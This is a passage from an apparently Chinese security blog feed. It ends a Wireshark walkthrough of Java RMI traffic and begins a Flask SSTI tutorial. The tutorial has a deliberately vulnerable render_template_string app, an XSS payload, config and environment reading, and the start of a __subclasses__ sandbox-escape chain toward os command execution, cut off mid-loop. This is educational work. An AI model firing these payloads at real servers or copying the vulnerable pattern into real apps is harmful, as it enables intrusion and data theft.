id="tcp-stream-eq-17"><a href="#tcp-stream-eq-17" class="headerlink" title="tcp.stream eq 17"></a>tcp.stream eq 17</h5><p>一开始是<code>TCP</code>三次握手</p><p><img src="/2021/12/01/Java-RMI/7.png" alt="7"></p><p>接着是RMI代理的确认工作，这里RMI代理返回了客户端的IP地址和端口，用于确认要进行的RMI服务是否是RMI客户端，如果RMI客户端做出响应，则代表RMI客户端需要RMI服务</p><p><img src="/2021/12/01/Java-RMI/8.png" alt="8"></p><p>随后是RMI客户端的确认工作，经过RMI客户端和RMI代理的确认之后，初始化工作就完成了</p><p><img src="/2021/12/01/Java-RMI/9.png" alt="9"></p><p>初始化工作完成后，RMI客户端开始请求RMI服务端，这一过程通过<code>RMI Call</code>完成</p><p><img src="/2021/12/01/Java-RMI/10.png" alt="10"></p><p>这里我们具体看一下请求的数据包，首先在Wireshark中追踪数据流，之后以RAW格式显示数据</p><p><img src="/2021/12/01/Java-RMI/11.png" alt="11"></p><p><img src="/2021/12/01/Java-RMI/12.png" alt="12"></p><p>可以明显的看到<code>ac ed 00 05</code>特征码，我们可以利用<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a>工具进行解析</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % java -jar SerializationDumper-v1.13.jar 50aced00057722000000000000000000000000000000000000000000000000000344154dc9d4e63bdf74000568656c6c6f73720019726d692e7365727665722e48656c6c6f496d706c5f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e696361737452656600093132372e302e302e310000e2ab53b1d296bd7e099cac7c1a220000017d73a2f78e80010078</span><br><span class="line"></span><br><span class="line">RMI Call - 0x50</span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - 0x77</span><br><span class="line">    Length - 34 - 0x22</span><br><span class="line">    Contents - 0x000000000000000000000000000000000000000000000000000344154dc9d4e63bdf</span><br><span class="line">  TC_STRING - 0x74</span><br><span class="line">    newHandle 0x00 7e 00 00</span><br><span class="line">    Length - 5 - 0x00 05</span><br><span class="line">    Value - hello - 0x68656c6c6f</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 25 - 0x00 19</span><br><span class="line">        Value - rmi.server.HelloImpl_Stub - 0x726d692e7365727665722e48656c6c6f496d706c5f53747562</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后是<code>ReturnData</code>的数据包</p><p><img src="/2021/12/01/Java-RMI/13.png" alt="13"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % java -jar SerializationDumper-v1<span class="number">.13</span>.jar <span class="number">51</span>aced0005770f01353650820000017d739f868f800873720019726d692e7365727665722e48656c6c6f496d706c5f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300007078707732000a556e696361737452656600093132372e302e302e310000e25c35c1c19f1dabc88b353650820000017d739f868f80010178</span><br><span class="line"></span><br><span class="line">RMI ReturnData - <span class="number">0x51</span></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">    Length - <span class="number">15</span> - <span class="number">0x0f</span></span><br><span class="line">    Contents - <span class="number">0x01353650820000017d739f868f8008</span></span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">25</span> - <span class="number">0x00</span> <span class="number">19</span></span><br><span class="line">        Value - rmi.server.HelloImpl_Stub - <span class="number">0x726d692e7365727665722e48656c6c6f496d706c5f53747562</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在<code>ReturnData</code>数据包就包含了RMI服务端的IP和端口</p><p><img src="/2021/12/01/Java-RMI/14.png" alt="14"></p><p>之后RMI客户端就可以直接去访问RMI服务端上对应类的方法。</p><h5 id="tcp-stream-eq-18"><a href="#tcp-stream-eq-18" class="headerlink" title="tcp.stream eq 18"></a>tcp.stream eq 18</h5><p>一上来还是先进行三次握手</p><p><img src="/2021/12/01/Java-RMI/15.png" alt="15"></p><p>之后是RMI服务端和RMI客户端的一个验证过程，服务端询问客户端是否是<code>127.0.0.1</code>,如果客户端返回响应，则代表客户端需要RMI服务</p><p><img src="/2021/12/01/Java-RMI/16.png" alt="16"></p><p>客户端在做出回应同时，继续请求<code>127.0.0.1</code>，这一步是调用<code>java.rmi</code>包中的一些类</p><p><img src="/2021/12/01/Java-RMI/17.png" alt="17"></p><p>之后完成了<code>RMI Call</code>和<code>ReturnData</code>的过程</p><p><img src="/2021/12/01/Java-RMI/18.png" alt="18"></p><p>从<code>Raw</code>数据包中可以看出</p><p><img src="/2021/12/01/Java-RMI/19.png" alt="19"></p><p><img src="/2021/12/01/Java-RMI/20.png" alt="20"></p><p><img src="/2021/12/01/Java-RMI/21.png" alt="21"></p><p>这一步完成之后，RMI客户端会将参数传输给RMI服务端，服务端会在本地执行后返回结果。</p><p><img src="/2021/12/01/Java-RMI/22.png" alt="22"></p><p>服务端会将参数带入<code>sayHello()</code>函数执行，并将结果返回给客户端</p><p><img src="/2021/12/01/Java-RMI/23.png" alt="23"></p><p>最后进行<code>TCP</code>四次挥手并结束此次调用流程。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;Java RMI 指的是远程方法调用 (Remote Method Invocation)。它是一种机制，能够让在某个 Java 虚拟机上的
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>SSTI模版注入</title>
    <link href="elssm.github.io/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
    <id>elssm.github.io/2021/11/29/SSTI模版注入/</id>
    <published>2021-11-29T10:12:49.000Z</published>
    <updated>2021-12-13T09:50:57.706Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>SSTI(Server-Side Template Injection)漏洞是模版引擎在使用渲染函数的时候，由于代码不规范而导致的代码注入漏洞，模版引擎和渲染函数本身是没有漏洞的，该漏洞的产生原因在于程序员对代码的不严谨不规范，导致了模版可控，从而引发代码注入。</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul><li>python3.6</li><li>Flask框架</li></ul><p><code>app.py</code>中代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_word</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello word!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test1')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    html_content = <span class="string">'use render_template_string'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/ssti')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    code = request.args.get(<span class="string">'code'</span>)</span><br><span class="line">    html_content = <span class="string">'&lt;h3&gt;%s&lt;/h3&gt;'</span> % (code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"10.100.163.201"</span>)</span><br></pre></td></tr></table></figure><p>访问<code>5000</code>端口如下所示</p><p><img src="/2021/11/29/SSTI模版注入/1.png" alt="1"></p><h4 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a>渲染方法</h4><p>Flask中的渲染方法有两种，分别是<code>render_template()</code>和<code>render_template_string()</code></p><p><strong>使用 <code>render_template()</code> 函数来渲染一个指定的文件</strong> , 这个指定的文件其实就是模板。其模板文件一般放在 <code>templates</code> 目录下</p><p>我们在<code>templates</code>目录下创建<code>hello.html</code>文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello! Elssm<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>http://10.100.163.201:5000/hello</code>如下所示</p><p><img src="/2021/11/29/SSTI模版注入/2.png" alt="2"></p><p>Flask 是使用<code>Jinja2</code> 作为渲染引擎的，在实际项目中 , 模板并不是纯 HTML 文件 , 而是一个夹杂模板语法的 HTML 文件 . 例如要使得页面的某些地方动态变化, 就需要使用模板支持的语法来传参数 ，比如我们可以在<code>render_template()</code>传入参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>,content=<span class="string">'this is a test'</span>)</span><br></pre></td></tr></table></figure><p>这个时候将<code>hello.html</code>文件如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello! Elssm<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123; &#123;content&#125; &#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个时候访问<code>http://10.100.163.201:5000/hello</code>如下所示</p><p><img src="/2021/11/29/SSTI模版注入/3.png" alt="3"></p><p>可以看到，在<code>Jinja2</code>中，使用<code>{ {} }</code>作为变量包裹的标识符，用于打印模版输出的表达式。</p><p>另一个渲染函数是<code>render_template_string()</code>，用来渲染一个字符串。</p><p>通过访问<code>http://10.100.163.201:5000/test1</code>查看</p><p><img src="/2021/11/29/SSTI模版注入/4.png" alt="4"></p><p>但是如果在该函数中没有做好有效的防范，就会造成一些严重的危害</p><h4 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h4><p>在<code>app.py</code>文件中，我们通过<code>/ssti</code>路由可以发送<code>GET</code>请求，但是由于在后端没有对用户输入做一个严格的校验，这样就会产生XSS攻击。</p><h5 id="常规的get请求"><a href="#常规的get请求" class="headerlink" title="常规的get请求"></a>常规的get请求</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.100.163.201:5000/ssti?code=test</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/5.png" alt="5"></p><h5 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.100.163.201:5000/ssti?code=%3Cscript%3Ealert(1)%3C/script%3E</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/6.png" alt="6"></p><h4 id="SSTI读取环境变量"><a href="#SSTI读取环境变量" class="headerlink" title="SSTI读取环境变量"></a>SSTI读取环境变量</h4><p>对于Flask的模版渲染而言，如果我们要让服务器执行代码，需要将执行的命令包裹在<code>{ {} }</code>中，对于一个GET请求，包裹在<code>{ {} }</code>中的参数会被后端计算，然后将结果拼接到模版中，完成渲染后返回给用户。</p><h5 id="request-environ"><a href="#request-environ" class="headerlink" title="request.environ"></a>request.environ</h5><p><code>request</code>是Flask框架中的一个全局对象，当我们访问<code>request</code>时可以看到当前的请求</p><p><img src="/2021/11/29/SSTI模版注入/7.png" alt="7"></p><p>在<code>request</code>对象中有一个<code>environ</code>对象名，<code>request.environ</code>是一个与服务器环境相关的对象字典</p><p><img src="/2021/11/29/SSTI模版注入/8.png" alt="8"></p><h5 id="config-items"><a href="#config-items" class="headerlink" title="config.items"></a>config.items</h5><p><code>congfig</code>也是Flask框架中的一个全局对象，其中也包含一些敏感信息</p><p><img src="/2021/11/29/SSTI模版注入/9.png" alt="9"></p><h4 id="SSTI任意文件读写"><a href="#SSTI任意文件读写" class="headerlink" title="SSTI任意文件读写"></a>SSTI任意文件读写</h4><p>对于任意文件读写，我们可以通过python的<code>os</code>模块实现，在Jinja2中是可以直接访问python的一些对象及其方法的，如字符串对象及其upper函数，列表对象及其count函数，字典对象及其has_key函数,那么怎么能够在Jinja2模板中访问到python中的内置变量并且可以调用对应变量类型的方法，这就使用到了python沙盒逃逸。</p><h5 id="python沙箱逃逸"><a href="#python沙箱逃逸" class="headerlink" title="python沙箱逃逸"></a>python沙箱逃逸</h5><p>沙箱逃逸就是在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限的过程，这就需要执行一些命令，在python中，可执行命令的模块有如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os</span><br><span class="line">pty</span><br><span class="line">subprocess</span><br><span class="line">platform</span><br><span class="line">commands</span><br></pre></td></tr></table></figure><h5 id="python魔法函数"><a href="#python魔法函数" class="headerlink" title="python魔法函数"></a>python魔法函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回调用的类型</span><br><span class="line">__mro__ 查看类继承的所有父类，直到object</span><br><span class="line">__subclasses__ 获取类所有的子类</span><br><span class="line">__bases__ 返回所有直接父类组成的元组</span><br><span class="line">__init__ 类实例创建之后调用，对当前对象的实例的一些初始化</span><br><span class="line">__globals__ 能够返回函数所在模块命名空间的所有变量</span><br><span class="line">__getattribute__ 当类被调用的时候，无条件进入此函数</span><br><span class="line">__getattr__ 对象中不存在的属性时调用</span><br></pre></td></tr></table></figure><p>对于获取到os类从而达到命令执行的效果，具体的操作如下</p><h5 id="获取字符串的类对象"><a href="#获取字符串的类对象" class="headerlink" title="获取字符串的类对象"></a>获取字符串的类对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/10.png" alt="10"></p><h5 id="寻找基类"><a href="#寻找基类" class="headerlink" title="寻找基类"></a>寻找基类</h5><p>这一步的目的是利用继承关系找到object类</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/11.png" alt="11"></p><h5 id="寻找可引用类"><a href="#寻找可引用类" class="headerlink" title="寻找可引用类"></a>寻找可引用类</h5><p>在object类下查找所有的子类，然后查找到可利用的类</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()</span><br><span class="line">[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'dict_reversekeyiterator'&gt;, &lt;class 'dict_reversevalueiterator'&gt;, &lt;class 'dict_reverseitemiterator'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'pickle.PickleBuffer'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'InterpreterID'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'BaseException'&gt;, &lt;class 'hamt'&gt;, &lt;class 'hamt_array_node'&gt;, &lt;class 'hamt_bitmap_node'&gt;, &lt;class 'hamt_collision_node'&gt;, &lt;class 'keys'&gt;, &lt;class 'values'&gt;, &lt;class 'items'&gt;, &lt;class 'Context'&gt;, &lt;class 'ContextVar'&gt;, &lt;class 'Token'&gt;, &lt;class 'Token.MISSING'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'posix.ScandirIterator'&gt;, &lt;class 'posix.DirEntry'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'zipimport._ZipImportResourceReader'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_abc._abc_data'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'types.GenericAlias'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class 'types.DynamicClassAttribute'&gt;, &lt;class 'types._GeneratorWrapper'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class 'itertools.accumulate'&gt;, &lt;class 'itertools.combinations'&gt;, &lt;class 'itertools.combinations_with_replacement'&gt;, &lt;class 'itertools.cycle'&gt;, &lt;class 'itertools.dropwhile'&gt;, &lt;class 'itertools.takewhile'&gt;, &lt;class 'itertools.islice'&gt;, &lt;class 'itertools.starmap'&gt;, &lt;class 'itertools.chain'&gt;, &lt;class 'itertools.compress'&gt;, &lt;class 'itertools.filterfalse'&gt;, &lt;class 'itertools.count'&gt;, &lt;class 'itertools.zip_longest'&gt;, &lt;class 'itertools.permutations'&gt;, &lt;class 'itertools.product'&gt;, &lt;class 'itertools.repeat'&gt;, &lt;class 'itertools.groupby'&gt;, &lt;class 'itertools._grouper'&gt;, &lt;class 'itertools._tee'&gt;, &lt;class 'itertools._tee_dataobject'&gt;, &lt;class 'operator.itemgetter'&gt;, &lt;class 'operator.attrgetter'&gt;, &lt;class 'operator.methodcaller'&gt;, &lt;class 'reprlib.Repr'&gt;, &lt;class 'collections.deque'&gt;, &lt;class '_collections._deque_iterator'&gt;, &lt;class '_collections._deque_reverse_iterator'&gt;, &lt;class '_collections._tuplegetter'&gt;, &lt;class 'collections._Link'&gt;, &lt;class 'functools.partial'&gt;, &lt;class 'functools._lru_cache_wrapper'&gt;, &lt;class 'functools.partialmethod'&gt;, &lt;class 'functools.singledispatchmethod'&gt;, &lt;class 'functools.cached_property'&gt;, &lt;class 'contextlib.ContextDecorator'&gt;, &lt;class 'contextlib._GeneratorContextManagerBase'&gt;, &lt;class 'contextlib._BaseExitStack'&gt;, &lt;class 'enum.auto'&gt;, &lt;enum 'Enum'&gt;, &lt;class 're.Pattern'&gt;, &lt;class 're.Match'&gt;, &lt;class '_sre.SRE_Scanner'&gt;, &lt;class 'sre_parse.State'&gt;, &lt;class 'sre_parse.SubPattern'&gt;, &lt;class 'sre_parse.Tokenizer'&gt;, &lt;class 're.Scanner'&gt;, &lt;class 'typing._Final'&gt;, &lt;class 'typing._Immutable'&gt;, &lt;class 'typing.Generic'&gt;, &lt;class 'typing._TypingEmpty'&gt;, &lt;class 'typing._TypingEllipsis'&gt;, &lt;class 'typing.Annotated'&gt;, &lt;class 'typing.NamedTuple'&gt;, &lt;class 'typing.TypedDict'&gt;, &lt;class 'typing.io'&gt;, &lt;class 'typing.re'&gt;, &lt;class 'importlib.abc.Finder'&gt;, &lt;class 'importlib.abc.Loader'&gt;, &lt;class 'importlib.abc.ResourceReader'&gt;, &lt;class 'rlcompleter.Completer'&gt;]</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/12.png" alt="12"></p><h5 id="寻找含有os库的类"><a href="#寻找含有os库的类" class="headerlink" title="寻找含有os库的类"></a>寻找含有os库的类</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__mro__[<span 